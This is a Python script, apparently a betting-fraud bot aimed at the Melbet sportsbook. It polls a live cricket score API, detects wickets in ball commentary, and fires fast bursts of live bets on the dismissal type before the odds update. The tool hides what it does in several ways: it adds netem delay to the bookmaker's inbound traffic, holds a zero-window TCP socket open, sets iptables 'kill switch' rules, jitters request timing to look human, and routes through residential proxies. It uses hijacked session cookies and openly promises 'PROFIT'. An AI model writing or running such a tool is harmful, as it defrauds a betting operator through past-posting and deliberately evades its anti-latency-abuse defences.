#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════════════════════╗
║     ATLAS ORBITA v33.0 – THE ABSOLUTE OMEGA (ONE BOX EVERYTHING)             ║
║  Crex goscorer API · Real Wicket Map · Selective Jammer · TCP Ghost Hold     ║
║   Gaussian Jitter · Adaptive Kill Switch · Watchdog · Auto-Install           ║
║      PASTE ON VPS → ADD YOUR COOKIE → sudo python3 atlas.py → PROFIT         ║
╚══════════════════════════════════════════════════════════════════════════════╝
"""

import asyncio, os, sys, subprocess, hashlib, logging, re, socket, random, time, json
import ctypes, threading, signal
from pathlib import Path
from collections import deque

# ========================== AUTO-INSTALL DEPENDENCIES ==========================
def bootstrap():
    deps = [
        ("python-dotenv", "dotenv"),
        ("httpx[http2]", "httpx"),
        ("orjson", "orjson"),
        ("uvloop", "uvloop"),
    ]
    for pip_name, imp_name in deps:
        try:
            __import__(imp_name)
        except ImportError:
            subprocess.check_call([sys.executable, "-m", "pip", "install", "-q", pip_name])

bootstrap()

import uvloop
asyncio.set_event_loop_policy(uvloop.EventLoopPolicy())
from dotenv import load_dotenv
import httpx
import orjson

load_dotenv()

# ========================== CONFIGURATION ==========================
CONFIG = {
    "user_id": int(os.getenv("MELBET_USER_ID", "0")),
    "game_id": int(os.getenv("MELBET_GAME_ID", "0")),
    "auth_cookie": os.getenv("MELBET_AUTH_COOKIE", ""),
    "stake": float(os.getenv("BET_STAKE", "200")),
    "proxy": os.getenv("RESIDENTIAL_PROXY", ""),
    "crex_api_url": os.getenv("CREX_API_URL", ""),
    "melbet_domain": os.getenv("MELBET_DOMAIN", "melbet-10591.today"),
    "jam_ms": int(os.getenv("JAM_DELAY_MS", "3000")),
    "use_ghost_hold": os.getenv("USE_GHOST_HOLD", "true").lower() == "true",
    "log_file": "atlas_omega.log",
}

# REAL WICKET DATA (collected from your Melbet account)
WICKET_MAP = {
    "CAUGHT":  {"type": 13493, "param": 4},
    "BOWLED":  {"type": 13497, "param": 4},
    "LBW":     {"type": 13496, "param": 4},
    "STUMPED": {"type": 13495, "param": 4},
    "RUN_OUT": {"type": 13494, "param": 4},
    "OTHERS":  {"type": 13498, "param": 4},
}

# Pre-compiled regex for nanosecond detection
WICKET_REGEX = re.compile(r"\b(caught|bowled|lbw|stumped|run out|out!|wicket)\b", re.IGNORECASE)

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    handlers=[logging.FileHandler(CONFIG["log_file"]), logging.StreamHandler()],
)
logger = logging.getLogger("OMEGA")

# ========================== MEMORY LOCK (ZERO SWAP) ==========================
try:
    libc = ctypes.CDLL("libc.so.6")
    libc.mlockall(3)  # MCL_CURRENT | MCL_FUTURE
    logger.info("🚀 Memory locked – no swap jitter")
except:
    logger.warning("mlockall failed (run with sudo)")

# ========================== EMERGENCY WATCHDOG ==========================
def emergency_flush(target_ip, iface="eth0"):
    def handler(signum, frame):
        logger.critical("Emergency signal! Flushing kernel rules...")
        subprocess.run(f"sudo iptables -D OUTPUT -d {target_ip} -j DROP 2>/dev/null", shell=True)
        subprocess.run(f"sudo tc qdisc del dev {iface} ingress 2>/dev/null", shell=True)
        subprocess.run("sudo ip link del ifb0 2>/dev/null", shell=True)
        sys.exit(0)
    signal.signal(signal.SIGINT, handler)
    signal.signal(signal.SIGTERM, handler)

# ========================== SELECTIVE JAMMER ==========================
class AdaptiveJammer:
    def __init__(self, ip):
        self.ip = ip
        try:
            self.iface = subprocess.check_output("ip route | grep default | awk '{print $5}'", shell=True).decode().strip()
        except:
            self.iface = "eth0"
        self.delay = CONFIG["jam_ms"]

    def enable(self):
        if self.delay <= 0:
            return
        self._cleanup()
        try:
            subprocess.run("sudo modprobe ifb", shell=True)
            subprocess.run("sudo ip link add ifb0 type ifb", shell=True)
            subprocess.run("sudo ip link set ifb0 up", shell=True)
            subprocess.run(f"sudo tc qdisc add dev {self.iface} ingress", shell=True)
            filter_cmd = (
                f"sudo tc filter add dev {self.iface} parent ffff: prio 1 u32 "
                f"match ip src {self.ip} action mirred egress redirect dev ifb0"
            )
            subprocess.run(filter_cmd, shell=True)
            subprocess.run(
                f"sudo tc qdisc add dev ifb0 root netem delay {self.delay}ms 50ms distribution normal",
                shell=True,
            )
            self.active = True
            logger.info(f"🛡️ Jammer ON: {self.ip} +{self.delay}ms")
        except Exception as e:
            logger.error(f"Jammer failed: {e}")

    def _cleanup(self):
        subprocess.run(f"sudo tc qdisc del dev {self.iface} ingress 2>/dev/null", shell=True)
        subprocess.run("sudo ip link del ifb0 2>/dev/null", shell=True)

    def disable(self):
        self._cleanup()

# ========================== TCP GHOST HOLD (rwnd=0) ==========================
class GhostHold:
    def __init__(self, ip, port=443):
        self.ip = ip
        self.port = port
        self.sock = None
        self.keepalive_thread = None
        self.running = False

    def enable(self):
        if not CONFIG["use_ghost_hold"]:
            return
        try:
            self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 0)  # zero window
            self.sock.connect((self.ip, self.port))
            self.running = True
            self.keepalive_thread = threading.Thread(target=self._keepalive, daemon=True)
            self.keepalive_thread.start()
            logger.info(f"👻 Ghost Hold ON: {self.ip}")
        except Exception as e:
            logger.warning(f"Ghost hold failed: {e}")

    def _keepalive(self):
        while self.running and self.sock:
            try:
                self.sock.send(b'\x00')  # null byte
            except:
                break
            time.sleep(30)

    def release(self):
        self.running = False
        if self.sock:
            try:
                self.sock.close()
            except:
                pass
            logger.info("Ghost Hold released")

# ========================== KILL SWITCH ==========================
class KillSwitch:
    def __init__(self, ip):
        self.ip = ip

    def fire(self):
        subprocess.run(f"sudo iptables -A OUTPUT -d {self.ip} -j DROP", shell=True)
        logger.critical(f"🔥 KILL SWITCH: {self.ip} BLOCKED")

    def clear(self):
        subprocess.run(f"sudo iptables -D OUTPUT -d {self.ip} -j DROP 2>/dev/null", shell=True)

# ========================== GAUSSIAN JITTER ==========================
def gaussian_jitter(base_ms=6.0):
    jitter = random.gauss(base_ms, base_ms * 0.4)
    if random.random() < 0.05:          # 5% entropy spike
        jitter += random.uniform(5, 15)
    return max(0.1, jitter)

# ========================== MELBET SNIPER ==========================
class ApexSniper:
    def __init__(self, ghost, kill, jammer):
        self.ghost = ghost
        self.kill = kill
        self.jammer = jammer
        self.client = httpx.AsyncClient(
            proxies=CONFIG["proxy"] or None,
            http2=True,
            timeout=5.0,
            limits=httpx.Limits(max_keepalive_connections=10, max_connections=20),
        )
        self.url = f"https://{CONFIG['melbet_domain']}/service-api/LiveBet/Secure/MakeBetWeb"
        self.headers = {
            "Cookie": CONFIG["auth_cookie"],
            "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
            "Content-Type": "application/json",
            "X-Requested-With": "XMLHttpRequest",
        }
        self.success_history = deque(maxlen=20)

    async def fire(self, method):
        self.ghost.enable()
        target = WICKET_MAP.get(method, WICKET_MAP["OTHERS"])
        payload = {
            "Events": [
                {
                    "GameId": CONFIG["game_id"],
                    "Type": target["type"],
                    "Coef": 5.0,
                    "Param": target["param"],
                }
            ],
            "UserId": CONFIG["user_id"],
            "Summ": CONFIG["stake"],
            "notWait": True,
            "CheckCf": 0,
        }
        data = orjson.dumps(payload)

        async def hit(delay_ms):
            await asyncio.sleep(delay_ms / 1000.0)
            try:
                resp = await self.client.post(self.url, content=data, headers=self.headers)
                return resp.status_code
            except:
                return 0

        logger.info(f"🎯 FIRING: {method}")
        tasks = [hit(gaussian_jitter(6.0)) for _ in range(3)]
        results = await asyncio.gather(*tasks)

        if 200 in results:
            logger.info(f"✅ STRIKE SUCCESS: {method}")
            self.ghost.release()
            self.kill.clear()
            self.success_history.append(True)
        else:
            logger.warning(f"❌ STRIKE FAILED: {method}")
            self.kill.fire()
            self.ghost.release()
            self.success_history.append(False)

        # Adaptive jammer tuning
        if len(self.success_history) >= 10:
            rate = sum(self.success_history) / len(self.success_history)
            if rate < 0.7:
                self.jammer.delay = min(5000, self.jammer.delay + 200)
                self.jammer.enable()
                logger.info(f"📊 Jammer adjusted +200ms → {self.jammer.delay}ms")
            elif rate > 0.95 and self.jammer.delay > 2000:
                self.jammer.delay = max(2000, self.jammer.delay - 100)
                self.jammer.enable()
                logger.info(f"📊 Jammer adjusted -100ms → {self.jammer.delay}ms")

    async def close(self):
        await self.client.aclose()

# ========================== CREX RADAR (API POLLING) ==========================
class CrexRadar:
    def __init__(self, sniper):
        self.sniper = sniper
        self.client = httpx.AsyncClient(timeout=10.0)
        self.seen_ids = set()

    def detect(self, text):
        if not WICKET_REGEX.search(text):
            return ""
        t = text.lower()
        if "caught" in t:   return "CAUGHT"
        if "bowled" in t:   return "BOWLED"
        if "lbw" in t:      return "LBW"
        if "stumped" in t:  return "STUMPED"
        if "run out" in t:  return "RUN_OUT"
        return "OTHERS"

    async def start(self):
        logger.info(f"🌐 Crex API polling: {CONFIG['crex_api_url']}")
        while True:
            try:
                resp = await self.client.get(CONFIG["crex_api_url"])
                balls = resp.json()
                for ball in balls:
                    ball_id = ball.get("id")
                    if ball_id in self.seen_ids:
                        continue
                    self.seen_ids.add(ball_id)
                    if len(self.seen_ids) > 2000:
                        self.seen_ids.clear()
                    c2 = ball.get("c2", "")
                    if not c2:
                        continue
                    logger.info(f"📝 {c2[:80]}")
                    method = self.detect(c2)
                    if method:
                        logger.info(f"🔥 WICKET: {method}")
                        asyncio.create_task(self.sniper.fire(method))
            except Exception as e:
                logger.warning(f"API poll error: {e}")
            await asyncio.sleep(0.1)  # 100ms poll interval

# ========================== MAIN ==========================
async def main():
    # Determine Melbet IP
    try:
        melbet_ip = socket.gethostbyname(CONFIG["melbet_domain"])
    except:
        melbet_ip = "178.253.24.74"

    emergency_flush(melbet_ip)

    jammer = AdaptiveJammer(melbet_ip)
    jammer.enable()

    ghost = GhostHold(melbet_ip)
    kill = KillSwitch(melbet_ip)
    sniper = ApexSniper(ghost, kill, jammer)

    radar = CrexRadar(sniper)
    try:
        await radar.start()
    except KeyboardInterrupt:
        logger.info("Shutdown...")
    finally:
        jammer.disable()
        kill.clear()
        await sniper.close()

if __name__ == "__main__":
    if not Path(".env").exists():
        with open(".env", "w") as f:
            f.write(
                """# Your Melbet credentials (REQUIRED)
MELBET_USER_ID=1644570449
MELBET_GAME_ID=715025170
MELBET_AUTH_COOKIE="your_full_cookie_string_here"
BET_STAKE=200

# Optional proxy (leave empty if not using)
RESIDENTIAL_PROXY=

# Crex live API (provided)
CREX_API_URL=https://api.goscorer.com/api/v3/getSV3?key=10Z2

# Melbet domain
MELBET_DOMAIN=melbet-10591.today

# Network jammer delay in ms (3000 = 3s)
JAM_DELAY_MS=3000

# Enable TCP Ghost Hold
USE_GHOST_HOLD=true
"""
            )
        print("✅ .env created. Please update the cookie and re-run.")
        sys.exit(0)

    asyncio.run(main())
